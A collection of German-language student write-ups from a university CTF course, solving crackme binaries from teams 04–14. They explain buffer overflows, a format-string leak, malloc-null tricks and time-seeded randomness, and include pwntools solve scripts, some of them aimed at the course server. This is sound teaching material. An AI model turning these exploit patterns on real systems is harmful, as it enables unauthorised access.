
# Team 14


```text
Beschreibung
Multistage Exploits..

```
Stufe 1:
```
Es wird nach der Faktorisierung von X * Y = 2023 gefragt, wobei X und Y eingegeben werden müssen. Natürlich kann man nicht einfach 1 und 2023 eingeben, wäre ja zu einfach. Es existiert keine weitere Faktorisierung, da 2023 eine Primzahl ist. Daher muss ein Integer-Overflow / Underflow verwendet werden.

Wir wählen:
4294967295 + 2004 = 4294969299 (2004 statt 2003, weil 0 existiert)

-> 10071 426469 (Primfaktorzerlegung..)
```
Stufe 2:
```
Normaler Check mit Bufferoverflow, eine Variable muss 0xdeadbeef sein. Wir müssen also 10 Zeichen eingeben und dann 0xdeadbeef im richtigen Encoding angeben (jetzt mal ernsthaft, wer kann denn bitte schon little endian auf den ersten Versuch richtig eingeben, danke dass ihr es printet).
```
Stufe 3:
```
Currenttime muss in Sekunden umgerechnet werden, dann ein bisschen geshiftet werden. Wir replizieren es lokal und geben den Wert ein. Hier war das Problem, dass die Serverzeit unterschiedlich ist, wodurch wir lokal das Offset bestimmen und dann schnell nochmal lösen (in der gleichen Sekunde).
Siehe Script.
```
```python
from pwn import *
import time

pty = process.PTY

# context.log_level = 'debug'
p = process("./team_14", stdin=pty, stdout=pty)
# p = remote("tank.informatik.hs-mannheim.de", 3114)

# prime factorization
p.sendlineafter(b"?", b"10071 426469")

# stufe 2
p.sendlineafter(b"?", b"AAAAAAAAAA\xEF\xBE\xAD\xDE")

# stufe 3
currtime = int(time.time())
currtime = currtime ^ (currtime >> 0xc)
currtime = currtime ^ (currtime << 0x19)
currtime = currtime ^ (currtime >> 0x1b)

p.sendlineafter(b"?", str.encode(str(currtime)))
```
Script angepasst damit es automatisch das server time offset crackt:
```python
from pwn import *
import time

pty = process.PTY

# context.log_level = 'debug'
# p = process("./team_14", stdin=pty, stdout=pty)

def crack(curr, goal):
    i = 0
    while True:
        tmp = curr + i
        tmp = tmp ^ (tmp >> 0xc)
        tmp = tmp ^ (tmp << 0x19)
        tmp = tmp ^ (tmp >> 0x1b)
        print(i, tmp, goal)
        if tmp == goal:
            return i

        tmp = curr - i
        tmp = tmp ^ (tmp >> 0xc)
        tmp = tmp ^ (tmp << 0x19)
        tmp = tmp ^ (tmp >> 0x1b)
        if tmp == goal:
            return -i

        i = i + 1

while True:
    p = remote("tank.informatik.hs-mannheim.de", 3114)

    # prime factorization
    p.sendlineafter(b"?", b"10071 426469")

    # stufe 2
    p.sendlineafter(b"?", b"AAAAAAAAAA\xEF\xBE\xAD\xDE")

    # stufe 3
    currtime = int(time.time()) # server time..
    tmp = currtime
    currtime = currtime ^ (currtime >> 0xc)
    currtime = currtime ^ (currtime << 0x19)
    currtime = currtime ^ (currtime >> 0x1b)

    p.sendlineafter(b"?", str.encode(str(currtime)))
    p.recvuntil(b"an ")
    goaltime = p.recvall().decode()[:-1]
    timeoffset = crack(tmp, int(goaltime[:-1]))

    # clean coding bla bla bla
    p = remote("tank.informatik.hs-mannheim.de", 3114)

    # prime factorization
    p.sendlineafter(b"?", b"10071 426469")

    # stufe 2
    p.sendlineafter(b"?", b"AAAAAAAAAA\xEF\xBE\xAD\xDE")

    # stufe 3
    currtime = int(time.time()) + timeoffset # server time..
    print("New time", currtime)
    currtime = currtime ^ (currtime >> 0xc)
    currtime = currtime ^ (currtime << 0x19)
    currtime = currtime ^ (currtime >> 0x1b)

    p.sendlineafter(b"?", str.encode(str(currtime)))
    flag = p.recvall().decode()
    print(flag)

    if "FLAG{" in flag:
        break



FLAG{climbing_the_mountain}

```

# Team 13
```
Beschreibung
Schritt 1:
Einfach das, was an der Wand steht, mit "brainbrainbrain" xor'en, Ergebnis: xorgenius!

Schritt 2:
Benutzername und Passwort stehen in der jeweiligen Methode als Hexadezimalcode, Benutzername = Dev, Passwort = 1337 ABER

Schritt 3:
Es wird eine andere Variable benutzt --> ein Bufferoverflow wird bei einem der Eingaben benötigt.
Da der Benutzername komplett egal ist, muss das Passwort gefälscht werden.

Dabei fällt auf, dass die ersten drei Zeichen als Benutzername genommen werden müssen (muss Dev sein), dann muss der Stack mit 8 Zeichen überbrückt werden und der Wert 1337 im Speicher abgelegt werden.

Benutzername: egal
Passwort: DevAAAAAAAA1337

(oder irgendein beliebiges Zeichen statt A)

Anschließend erhalten wir die Flagge.

Bestätigung des Passworts nicht mit ENTER, SONDERN MIT CTRL + D!!
FLAG{FLAG{FLAG{FLAG{FLAG}}}}
```
# Team 12 
# *Einer Musterlösung für das Crackme
#### Malloc never fails
```
Wir haben uns entschieden, die Schwachstelle "Malloc never fails" zu behandeln. Wenn ein Fehler auftritt, gibt malloc normalerweise einen Nullpointer zurück, der üblicherweise erkannt und entsprechend behandelt werden sollte. In unserem Szenario geben wir einen Hinweis auf die richtige Eingabe, wenn eine zu große Zahl eingegeben wird.
```
#### vorgehenweise :
```
Der Bildschirm fordert den Agenten auf, einen speziellen Passcode einzugeben, um den Zugriff zu aktivieren. 
```
```console
┌──(mindh㉿TT)-[/mnt/c/Users/TT/Documents/GitHub/team-12/Assignment_032/Abgabe]
└─$ ./crackme
Welcome, Agent. Enter the passcode to access the secure file:
```
```
Wenn ein ungültiges Passwort eingegeben wird, wird ein Standardtext ausgegeben
```
``` console
┌──(mindh㉿TT)-[/mnt/c/Users/TT/Documents/GitHub/team-12/Assignment_032/Abgabe]
└─$ ./crackme
Welcome, Agent. Enter the passcode to access the secure file: 665664t4
Accessing personal identification required: Verifying... Access granted. Welcome, Agent. Proceed with caution.
```
```
Wenn beide Eingaben falsch sind, wird ein Alert ausgegeben.
```
```console
┌──(mindh㉿TT)-[/mnt/c/Users/TT/Documents/GitHub/team-12/Assignment_032/Abgabe]
└─$ ./crackme
Welcome, Agent. Enter the passcode to access the secure file: 43343
Accessing personal identification required: 4334
Spy Alert !!!!!!!!!!!!!!!!!!!
```
```
Sobald die Speicheranforderung zu groß wird, gibt Malloc einen Nullpointer zurück. Dies könnte dazu führen, dass ein Null-Byte willkürlich im Speicher geschrieben wird.
Der Agent sollte eine große Zahl eingeben, sodass malloc einen Nullpointer zurückgibt.
```
```
Hier ist eine falsche Flagge zu sehen, begleitet von dem Text 'Malloc never fails' und einigen Hexadezimalzahlen. Der Agent muss diese Zahlen analysieren und versuchen herauszufinden, was sie bedeuten. 378 in Dezimal ist 888,16D61 = 93537,2C61761=46536545 ,025DBF5B=39698267 .
```
```
┌──(mindh㉿TT)-[/mnt/c/Users/TT/Documents/GitHub/team-12/Assignment_032/Abgabe]
└─$ ./crackme
Welcome, Agent. Enter the passcode to access the secure file: 99999999999999999999999999999999999
Access denied. Security breach detected. Initiating lockdown protocol.
       /\     /\
      /  \___/  \
     /    | |    \
    /     | |     \
   /______________\
  / |          |   \
 /  |   FALSE  |    \
|   |   FALG{  |    |
|   |   Malloc |    |
|   |   never  |    |
|   |   fail,  |    |
|   |   16D61, |    |
|   |     378, |    |
|   |   2C6176 |    |
|   |   1,025D |    |
|   |   BF5B,   |    |
|___|__________|____|
```
```
Nachdem der Agent herausgefunden hat, dass '888' das Passwort ist und die Zahl '378' in Dezimal umgewandelt hat, muss er noch herausfinden, was der Begriff 'binary access code' bedeuten könnte.
```
```console
┌──(mindh㉿TT)-[/mnt/c/Users/TT/Documents/GitHub/team-12/Assignment_032/Abgabe]
└─$ ./crackme
Welcome, Agent. Enter the passcode to access the secure file: 888
Secure code verification required. Enter binary access code:

```
```
Nachdem er die Zahlen als Eingabe ausprobiert hat und herausgefunden hat, dass er  '2C61761' als Binärzahl eingeben soll, sieht er die richtige Flagge.
"FLAG{REE_LECTURES_WERE_FUN}"
```
```console
┌──(mindh㉿TT)-[/mnt/c/Users/TT/Documents/GitHub/team-12/Assignment_032/Abgabe]
└─$ ./crackme
Welcome, Agent. Enter the passcode to access the secure file: 888
Secure code verification required. Enter binary access code: 10110001100001011101100001
Access granted. Decrypting secure file...
  .-----------------.
 /                 /\
/                 /  \
|      _________|    |
|     |         |    |
|     |         |    |
FLAG{REE_LECTURES_WERE_FUN}
|     |         |    |
|     |         |    |
|     |_________|    |
|___________________|
File decrypted successfully. Extracted information: CONFIDENTIAL.
```

# Team-11
```
## C

***main Funktion***

```c
int main(void) {
  undefined *puVar1;
  int iVar2;
  time_t tVar3;
  size_t sVar4;
  char random_number [10];
  char string_buffer_overflow [10];
  undefined8 local_4e;
  undefined2 local_46;
  undefined local_44;
  char strcmp_condition_1 [10];
  char local_39;
  char *local_28;
  int local_20;
  ulong strcmp_condition_2;
  
  setup();
  tVar3 = time((time_t *)0x0);
  srand((uint)tVar3);
  strcmp_condition_2._0_4_ = genRandomSuperKey(0x14);
  
  // first input in checkIfRobot() serves as a captcha, to prevent brute-force attacks with scripts
  local_20 = checkIfRobot();
  if (local_20 == 0) {
     putchar(10);
     local_4e = 0x20656d6f636c6557;
     local_46 = 0x7325;
     local_44 = 0;
     printf("Type your name [max 9 chars]: ");
     
     // second input to overflow strcmp_condition_1 with value of string_to_win "chipichipi"
     fgets(string_buffer_overflow,255,stdin);
     fgets(string_buffer_overflow,255,stdin);
     printf((char *)&local_4e,string_buffer_overflow,(ulong)(uint)strcmp_condition_2);
     local_39 = '\0';

     // string_to_win is global variable with value "chipichipi"
     iVar2 = strcmp(strcmp_condition_1,string_to_win);
     if (iVar2 == 0) {
       puts("\nCongrats you entered a secret area");
       printf("Guess what number I am thinking of [0-20]: ");

       // third input probably to overflow strcmp_condition_2
       // strcmp_condition_2 then gets inserted into random_number
       // random_number is then compared with string_buffer_overflow
       __isoc99_scanf("%s",string_buffer_overflow);
       sprintf(random_number,"%d",(ulong)(uint)strcmp_condition_2);
       iVar2 = strcmp(random_number,string_buffer_overflow);
       if (iVar2 == 0) {
          puts("\nHi Boss");
          win();
          putchar(10);
       }
       else {
          puts("\nWhat a smart guess");
          printf("Here is your flag: ");
          puVar1 = KEY;
          sVar4 = strlen(FLAG);
          local_28 = (char *)xor_decrypt(FLAG,sVar4 & 0xffffffff,puVar1);
          printFlag(local_28);
          putchar(10);
       }
     }
     else {
       puts("\nThis APP is work in progress try again later...");
     }
  }
  else {
     puts("BOT");
  }
  return 0;
}
```

***checkIfRobot Funktion***

```c
void checkIfRobot(void) {
  char result_char [10];
  char user_input [5];
  uint second_number;
  uint first_number;
  int local_14;
  char operator;
  uint result_int;
  
  local_14 = genRandomSuperKey(3);
  first_number = genRandomSuperKey(100);
  second_number = genRandomSuperKey(100);
  operator = '+';
  result_int = second_number;
  if (local_14 == 1) {
    result_int = -second_number;
    operator = '-';
  }
  result_int = result_int + first_number;
  if (local_14 == 2) {
    result_int = first_number * second_number;
    operator = '*';
  }
  printf("Solve this test: %d %c %d = ",(ulong)first_number,(ulong)(uint)(int)operator,
         (ulong)second_number);
  __isoc99_scanf(&%s,user_input);
  sprintf(result_char,"%d",(ulong)result_int);
  strcmp(result_char,user_input);
  return;
}
```

## 1

Bei der ersten Eingabe in der checkIfRobot Funktion muss eine Mathe Aufgabe gelöst werden. 
Dabei werden zufällig zwei Zahlen zwischen 1 und 100 verwendet sowie ein zufälliger Operator +, - oder *.
Der Sinn hinter dieser Eingabe ist vermutlich ein Captcha, um Bruteforce/Fuzzing Angriffe mittels eines Skripts zu verhindern.
Falls das Ergebnis richtig eingegeben wurde gelangt man zur nächsten Eingabe.

```bash
$ ./crackme_11
Solve this test: 97 - 6 = 91

Type your name [max 9 chars]:
```

## 2

Die zweite Eingabe hat eine Buffer Overflow Schwachstelle, da 255 Zeichen mittels `fgets(string_buffer_overflow,255,stdin);` eingelesen werden, das Ziel jedoch nur 10 Zeichen Platz hat. 

Die Variable `char string_buffer_overflow [10];` wird zuerst mit den 10 Werten 12345678901234567890 gefüllt danach wird der 11 Zeichen lange String "Welcome %s\0" bestehend aus den Variablen `undefined8 local_4e;`, `undefined2 local_46;` und `undefined local_44;` mit den Werten 12345678901 gefüllt, zuletzt wird `char strcmp_condition_1 [10];` mit dem Wert "chipichipi" der globalen Variable `string_to_win`, welche im strcmp verwendet wird befüllt.

Zusammen ergibt dies für die zweite Eingabe "123456789012345678901chipichipi" um zur letzten Eingabe in der "secret area" zu gelangen.

```bash
$ ./crackme_11
Solve this test: 97 - 6 = 91

Type your name [max 9 chars]: 123456789012345678901chipichipi
12345678901chipichipi

Congrats you entered a secret area
Guess what number I am thinking of [0-20]:
```

## 3

Zu unserem Vorteil enthält der von uns vorhin betrachtete Codeabschnitt die folgende Zeile Code:


```
printf((char *)&printed_string,user_input,(ulong)rand_value);
```

Da außerdem printed_string in dem von uns überschreibbar Abschnitt liegt, können wir den in die Konsole dargestellten String so anpassen, dass er uns die zufällige Geheimzahl verrät:

```
$ ./crackme_11                                                     
Solve this test: 5 + 5 = 10

Type your name [max 9 chars]: 123456789000000000000chipichipi
Type your name [max 9 chars]: 1234567890%s-$d-00000chipichipi
1234567890%s-$d-00000chipichipi
16-00000chipichipi

Congrats you entered a secret area
Guess what number I am thinking of [0-20]: 16

Hi Boss
FLAG{chipi chipi chapa chapa dubi dubi daba daba}
```
# Assignment 33 - Team 10
## Flag
FLAG{Y0u_4r3_4_W1z4rd_H4rry}
 
## Beschreibung
In diesem Spiel ist es das Ziel einen Boss zu besiegen. Der Boss hat absurd hohe HP, der Damage ist viel zu niedrig um das in kurzer Zeit durch reines Spielen zu lösen.
 
Man kann an mehreren Stellen userInputs machen, einmal für Länge des Zauberspells (%d), dann einmal für Name des Zauberspells (%s).  
Hierbei ist folgende Stelle relevant:  
```c
    puts("Helfer: Alles klar, jetzt kannst du deinen Zauberspruch aufsagen: ");
    spellInput = local_70;
    *(undefined8 *)(puVar3 + randomUser + -8) = 0x100bf0;
    __isoc99_scanf(&scanString,spellInput);
    spellInput = local_70;
    local_70[(long)userBuffPlusOne + -1] = '\0';
    *(undefined8 *)(puVar3 + randomUser + -8) = 0x100c12;
    strcpy(spellName,spellInput);
```
 
Das Spiel liest eine Eingabe ein (spellInput), fügt ein Nullbyte ein und kopiert diese Eingabe dann in einen Buffer, welcher 20 byte groß ist (spellName). Über dem Buffer liegt der Damage und die Boss-HP auf dem Stack. Wir können also durch einen geeigneten Buffer-Overflow das ganze einfach überschreiben.  
Ein erster Gedanke könnte sein, die Boss-HP direkt auf 0 zu setzen, das funktioniert aber leider nicht, weil der Buffer durch strcpy kopiert wird, und diese Funktion beim ersten Nullbyte aufhört. Wir würden also nicht die Boss-HP überschreiben. Stattdessen schreiben wir direkt einen negativen Wert in den Speicher (0xFFFFFFFF). Es wird noch eins abgezogen, deswegen Enden wir bei -2. Wir erhalten die Ausgabe:  
```
Muahahaha! Du dachtest du kannst hier einfach reinplatzen und die Prinzessin retten?! Da musst du erstmal an mir vorbei!
 
Helfer: Los! Du musst dem Boss mit Zaubersprüchen Schaden anrichten! Hierzu musst du mir zuerst sagen, wie lang dein Zauberspruch ist, und dann den Zauberspruch sagen. Dir stehen folgende Zaubersprüche zur Verfügung: Expelliarmus, Bombarda, Incendio
 
Helfer: Wie lang ist dein Zauberspruch?:
Helfer: Alles klar, jetzt kannst du deinen Zauberspruch aufsagen:
 
HAHAHA! Du dachtest du kannst deine Zaubersprüche verstärken? Netter Versuch!!
 
Boss HP: -84215047
 
Boss: WAAAS?! Wie ist das möglich?? Du hast mich besiegt!!
 
Glückwunsch! Du hast die Prinzessin gerettet!!
 
FLAG{Y0u_4r3_4_W1z4rd_H4rry}
```
 
In der Ausgabe sind die Eingaben nicht dargestellt, da diese durch das Script gesendet wurden. Es gibt leider keine ASCII-Character, die hoch genug liegen.
 
## Script
```python
from pwn import *
 
pty = process.PTY
p = process("./team_10", stdin=pty, stdout=pty)
# p = remote("tank.informatik.hs-mannheim.de", 3110)
context.log_level = 'debug'
 
p.sendlineafter(b": ", b"30")
p.sendlineafter(b": ", b"A" * 20 + b"A" * 4 + b"\xFF" * 4)
 
flag = p.recvall().decode()
 
print(flag)
```

#  Team 09

```



 
## Beschreibung  
Ich habe ehrlich gesagt keine Ahnung was dieses brainfuck interpreter ding in der encrypt() machen soll.
 
```c
undefined8 main(void)
 
{
  int cmpresult;
  size_t keylength;
  long in_FS_OFFSET;
  undefined key [4];
  int local_60;
  int local_5c;
  void *someBuff;
  undefined2 magic;
  undefined local_49;
  undefined userInput [40];
  long canary;
 
  canary = *(long *)(in_FS_OFFSET + 0x28);
  local_60 = 0x13;
  keylength = strlen(::key);
  local_5c = (int)keylength;
  someBuff = malloc(0x13);
  magic = 0x7266;
  local_49 = 0x70;
  memset(userInput,0,0x20);
  printf("Enter message: ");
  __isoc99_scanf(&readString,userInput);
  printf("Enter key: ");
  __isoc99_scanf(&readDouble,key);
  keylength = strlen((char *)&magic);
  encrypt((char *)&magic,(int)keylength);
  cmpresult = strcmp((char *)&magic,"secure");
  if (cmpresult == 0) {
    xor_crypt(someBuff,crypt,(long)local_60,::key,(long)local_5c);
    print_array(someBuff,(long)local_60);
  }
  else {
    puts("Done.");
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                    /* WARNING: Subroutine does not return */
    __stack_chk_fail();
  }
  return 0;
}
```
 
magic und local haben den String "frp" (fr + p), die Nutzereingabe wird an diesen angehängt in der encrypt-Funktion. Dort wird weiter der String mit einer caesar-Ciphre verschlüsselt (Shift 13). Unser Ziel ist es, dass die Nutzereingabe mit frp das Wort "secure" ergibt. Dies ist möglich, da "frp" um 13 verschoben "sec" ist, wir müssen also nur noch "ure" einfügen. Dafür verschieben wir das ganze auch um 13 (DoppelROT13) und erhalten "her".
 
Nach der Eingabe:  
```bash
./team_09
Enter message: her
Enter key: 13
FLAG{the_real_flag}
```
 
erhalten wir die Flag.
## Flag  
FLAG{LuckyNumberSlevin}
```
```
# Team 08
Flag
FLAG{Format Is Important}

Notiz
War das so angedacht?

Beschreibung:
Ein simpler Bufferoverflow, der dazu führt, dass ein Check erfüllt wird. Es wird kein bestimmter Wert geprüft, wir nehmen deswegen einfach einen Haufen A's:

echo -ne "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" | ./team_08

You shall not pass!
Psst, don't look: 0x56455de0071a
Did you hear something?FLAG{Format Is Important}
```
```
# Team 7 
```

## Beschreibung des Programms

Weihnachten ist vorbei und ein neuer Lenz ist ins Land gezogen. Gemäß des alten Gedichts [Advent, Advent, ein Lichtlein brennt](https://de.wikipedia.org/wiki/Advent,_Advent,_ein_Lichtlein_brennt) hat der Grinch Weihnachten verpennt.
Deine Aufgabe? Halte Ihn davon ab schlimmeres zu tun! Und was hat es mit dieser nervigen Erzählstimme auf sich?

Der Grinch hasst übrigens Anti-Käfer-Mittelchen. Und auch Käfer-Mittelchen. Er hasst alles.

## Beschreibung der Exploits

Wir laden die Datei in Ghidra und analysieren diese. Wir betrachten zunächst die main()-Funktion.
Es werden einige verschiedene Methoden aufgerufen. Wir betrachten diese nacheinander.

setup(): Nichts besonderes, es wird ein Terminierungstimer gesetzt, damit das Programm auf dem Server terminiert nach einer gewissen Zeit.
tellStory(): Gibt nur einige Strings aus, die eine kleine Geschichte erzählen.
printMenu(): Gibt ein kleines Menü aus.
handleUserInput():
```c
void handleUserInput(void)

{
  int iVar1;
  size_t sVar2;
  char userInput [112];
  
  while( true ) {
    while( true ) {
      while( true ) {
        while( true ) {
          while( true ) {
            while( true ) {
              do {
                printf("\n[Narrator] What do you intend to do?\n> ");
                fgets(userInput,100,stdin);
                sVar2 = strcspn(userInput,"\n");
                userInput[sVar2] = '\0';
              } while (userInput[0] == '\0');
              iVar1 = strcmp(userInput,"ask");
              if (iVar1 != 0) break;
              ask();
            }
            iVar1 = strcmp(userInput,"give");
            if (iVar1 != 0) break;
            give();
          }
          iVar1 = strcmp(userInput,"The Grinch");
          if (iVar1 != 0) break;
          askGrinch();
        }
        iVar1 = strcmp(userInput,"Narrator");
        if (iVar1 != 0) break;
        askNarrator();
      }
      iVar1 = strcmp(userInput,"leave");
      if (iVar1 != 0) break;
      leave();
    }
    iVar1 = strcmp(userInput,"guess");
    if (iVar1 != 0) break;
    guess();
  }
  printf("[Narrator] You can\'t possibly want to \'%s\'! Can you?\n",userInput);
  printf("Segmentation fault (core dumped)");
  return;
}
```

Ghidra zeigt hier eine obskure Methode an, die einige Vergleiche durchführt und basierend auf diesen verschiedene Funktionen aufruft.
Innerhalb dieser Funktionen fällt schnell auf, dass es ein Struct gibt, welches den Grinch abbilden soll. Die Werte, welche dort drin abgelegt sind, sind nicht sehr hilfreich und können nicht ohne weitere Schritte genutzt werden, um eine Flag auszugeben. Neben den angezeigten Befehlen fällt nach einer kurzen Analyse jedoch recht schnell auf, dass das Programm weitere Fälle unterscheiden kann.
Diese werden nun weiter betrachtet.

Die ask()-Funktion scheint einen Userinput einzulesen und anschließend diesen mit etwas zu vergleichen und dann einen Check zu machen auf ein Feld des Grinches. Wenn dieser Wert größer als 3000 ist wird ein geheimer Wert ausgegeben.

### The Grinch - Part 1
Wir betrachen den Code der askGrinch()-Funktion, welcher über das Menü aufgerufen werden kann:

```c
void askGrinch(void)

{
  int comparisonResult;
  size_t nullCharPos;
  char userInput [108];
  int magicNum;
  
  printf(
        "[The Grinch] What do you want from me? I need to steal christmas! If only i could remember my favorite phrase..\n> "
        );
  fgets(userInput,0x73,stdin);
  nullCharPos = strcspn(userInput,"\n");
  userInput[nullCharPos] = '\0';
  comparisonResult = strcmp(userInput,"present");
  if ((comparisonResult == 0) && (magicNum == 0x1337)) {
    puts("[The Grinch] Oh, you stole something for me? Very good! Wait.. i think i remember!");
    puts("[The Grinch] I place it inside a present box in this heap of boxes! Wait a second..");
    sleep(2);
    puts("[The Grinch] Found it!");
    deleteFileContents(&DAT_001029d3);
    theGrinch = theGrinch + 1000;
    puts("[The Grinch] ...");
    puts("[The Grinch] Share it with you? Why would i ever do that? It\'s MY favorite phrase.");
    theGrinch = theGrinch + -2;
  }
  else {
    printf("[The Grinch] \'%s\'? Really? Did you really have to bother me with this? You know what, i think you\'ll take a pause."
           ,userInput);
    theGrinch = theGrinch + -1000;
    sleep(5);
  }
  return;
}
```

Der erste Exploit besteht aus einem klassischen Buffer-Overflow, welcher durch einen zu kleinen Buffer beim strcpy ausgelöst wird. Das Userinput-Array wird mit einer Length von 100 initialisiert, es werden jedoch 115 Zeichen geschrieben. Im Anschluss wird mit strcmp geprüft, ob der Userinput "present" war und ob eine geheime Zahl 0x1337 entspricht. Dies kann erreicht werden, indem der Bufferflow nach den Buchstaben "present" mit \x00 terminiert wird; jedoch weitere Bytes übergeben werden.

Der Grinch ruft anschließend eine Funktion "deleteFileContents()" auf, welche einen Dateinamen übergeben bekommt. Dieser Methodenname ist absichtlich irreführend gewählt. Die Methode lädt beim ersten Aufruf nicht die Flag, sondern xor'ed jeden Wert einer Menge von Zahlen (ein Byte-Array) mit dem Wert 0x10 und setzt dies als die Flag im Gehirn des Grinches. Beim zweiten Aufruf mit dem gleichen Exploit wird die tatsächliche Flag geladen.
Dies soll verifizieren, dass die Leute, die diese Aufgabe lösen, tatsächlich den gesamten Code lesen, bevor sie ihn ausführen. In der realen Welt hätte ein Angreifer beliebigen Code in dieser if-Bedingung verstecken können, weshalb hierdurch sensibilisiert werden soll.

Das Laden der Flag weckt schöne Erinnerungen im Grinch, wodurch dessen Herz wächst. Eine der benötigten Bedingungen, damit die Flag ausgegeben wird.

### The Narrator
Im nächsten Schritt kann der Spieler ein abgekartetes Blackjack gegen den Erzähler spielen. Dieser wird immer gewinnen, außer der Spieler schafft es zu cheaten. Dies ist der Fall, wenn dieser es schafft den Wert ["BonanzaBugs"](https://www.youtube.com/watch?v=XI4fex06rc4) zu übergeben und somit ein gnadenloses Blackjack mit einer Karte zu erzielen. Ähnlich wie im vorherigen Exploit muss auch hier die strcmp Funktion ausgenutzt werden. Der Spieler übergibt diesmal jedoch eine Zahl, mit welcher er spielen möchte und anschließend seinen Cheatcode nach einem null-byte.

Der gewissenlose Grinch freut sich über diesen Spielzug und mag den Spieler nun wieder mehr.

```c
void askNarrator(void)

{
  int comparisonResult;
  char userBet;
  char magic [12];
  
  puts(
      "[Narrator] Well, i\'m flattered, you see? But it doesn\'t change a thing that i can\'t help y ou."
      );
  puts("[Narrator] Well, i can try at least, i guess. What can i do for you?");
  puts("[Narrator] You want to.. play a game? But then the grinch will be angry! He hates games!");
  puts("[Narrator] ...");
  puts("[Narrator] ...");
  puts("[Narrator] ...");
  printf("[Narrator] Okay, bet some chocolate coins, we\'ll play black jack.\n> ");
  __isoc99_scanf(&DAT_0010274d,&userBet);
  if (userBet < '1') {
    puts("[Narrator] Bettin\' nothin, huh? Next time maybe.");
  }
  else if (userBet < ':') {
    comparisonResult = strcmp(magic,"BonanzaBugs");
    if (comparisonResult == 0) {
      puts(
          "[The Grinch] Har, har, har! Looks you\'ve got made a fool of by them, doesn\'t it, Narrat or?"
          );
      puts("[The Grinch] Hey you, slowly, i\'m beginning to like you!");
      theGrinch = theGrinch + 500;
    }
    else {
      puts("[Narrator] Welp, you lost! I have 21, you have 4.");
    }
  }
  else {
    puts("[Narrator] It\'s just a game, chill.");
  }
  return;
}
```

Wir erkennen zum Glück aus dem Text den Kontext des Codes und können so auf Variablen-Namen schließen und darauf, was der Code tut.

### The Grinch - Part 2
Da der Grinch den Spieler nun genug mag, kann dieser ein Geheimnis aus dem Grinch rauskitzeln. Da das ganze aber zu einfach wäre, spielen wir ein Spiel mit dem Grinch, welcher sich eine "beliebige" Zahl ausdenken darf. Hierfür wird eine _unseeded_ rand()-Funktion benutzt (diese benutzt immer den Seed 0). Auf jeder Plattform wird somit immer der gleiche Startwert ausgegeben als erste Zufallszahl, welche der Spieler eingeben kann um das Geheimnis des Grinches zu erfahren. Schafft der Spieler nicht, diesen Exploit auszunutzen, so muss er von vorne beginnen. Versprechen müssen eingehalten werden.

Wir zeigen an dieser Stelle keinen Code, da es tatsächlich nur die rand()-Funktion ist, welche von Bedeutung ist.

### The Grinch - Part 3
Zuletzt kann der Spieler den Grinch ansprechen und ihm sein Geheimnis nennen. Jedoch muss der Spieler auch hier noch einen geheimen Wert übergeben, welcher aus dem Input berechnet wird. Die "tolle" Funktion christmasMagic(int x, int y, int z) berechnet lediglich x + y. Zuvor erfolgt noch eine Prüfung eines geheimen Kennworts, dem Namen des Haustiers des Grinches. Diesen muss der Spieler erneut mit einem Exploit der strcmp-Methode übergeben, bei welchem die christmasMagic()-Funktion den gewünschten Wert berechnet (hier 3, da zuvor im ersten Exploit 2 abgezogen wurden, da der Grinch enttäuscht war; --> 2998 + 3 > 3000). 
Anschließend gibt der Grinch seine Flag (oder das YouTube-Video) aus und beendet das Spiel.

```c
int christmasMagic(uint x,uint y,uint z)

{
  return (~x & z) * 3 +
         ((~(z ^ x) +
          ((((~(y | x) * 4 + (((y & ~x) * 4 - (y ^ x)) - (y | x))) - ~(y ^ x)) - ~y) - (~y | x)) + 1
          + x * 6 + ~z * 5) - (x | z)) + ~x * -2 + ~(z | x) * -4 + (x & ~z) * -4;
}
```

Wir erkennen wahrscheinlich nicht sofort, dass es sich hierbei um eine mixed boolean algebra expression handelt und stellen einen Carnaugh-Table auf und vereinfachen die "Schaltung" zu einem einfachen return x + y. christmasMagic berechnet also nur eine triviale Addition.
```
```
# team 06

FLAG{LuckyNumberSlevin} 

Von pwnable.kr geklaut leider (kenne es noch von früher), ansonsten wäre es ein verdammt gutes ctf

Lösung:
In dieser Schleife
```c
  for (i = 0; i < 6; i = i + 1) {
    for (inputNum = 0; inputNum < 6; inputNum = inputNum + 1) {
      if (drawnNumbers[i] == *(byte *)((long)&eingabe + (long)inputNum)) {
        correctNumbers = correctNumbers + 1;
      }
    }
  }
```

Wird nicht geprüft, ob eine Ziffer doppelt vorkommt in der Eingabe, dadurch kann man einfach 6x das gleiche Zeichen einfügen und ein paar mal versuchen bis die zahl dabei ist (die dann 6-fach gewertet wird)

Wir benutzen hier `******`, weil 42 meine Lieblingszahl ist (for the moment)

Script:
```python
from pwn import *

# sorry dear server ;P
# DON'T RUN THIS LOCALLY!
while True:
    # pty = process.PTY
    # p = process("./team_06", stdin=pty, stdout=pty)
    p = remote("tank.informatik.hs-mannheim.de", 3106)

    p.sendlineafter(b": ", b"******")
    flag = p.recvall().decode()
    print(flag, "FLAG{" in flag)
    if "FLAG{" in flag:
        print("worked", flag)
        break
```
# Assignment 33 - Team 05

## Beschreibung
Dreistufiges CTF, bei welchem mehrere Eingaben getätigt werden müssen, um die Flag zu erhalten. (Oder man hat Augen und schaut einfach in den Code..)

**Stufe 1:**  
Bufferoverflow auf zwei Variablen, müssen ScoobyDo ergeben

**Stufe 2:**  
Malloc muss null returnen, daher muss zuviel Speicher allokiert werden; einfach eine sehr große Zahl eingeben (siehe Script).

**Stufe 3:**  
Zeichen müssen 2024 ergeben, wenn man die charCodes addiert. String muss mit einem Nullbyte enden (oder genau 21 Zeichen lang sein).
Wir verwenden 16 mal das Zeichen x (120) und einmal h (104), und erhalten 2024 in unter 21 Zeichen (plus ein Nullbyte).

## Script

```python
from pwn import *

pty = process.PTY
p = process("./team_05", stdin=pty, stdout=pty)
# p = remote("tank.informatik.hs-mannheim.de", 3105)
# context.log_level = 'debug'

p.sendlineafter(b":", b"AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAScoobyDo")
p.sendlineafter(b"!", b"99999999999999999999999")
p.sendlineafter(b"...", b"xxxxxxxxxxxxxxxxh\x00") # 2024 = 16 * 120 + 104 

# p.recvuntil("FLAG{")
flag = p.recvall().decode()

print(flag)
## Flag
FLAG{scooby_dooby_doo_where_are_you?}
```
#  Team 04
```


## Beschreibung
Der Code wird in dieser Aufgabe nicht eingefügt, da dieser ziemlich lange ist.
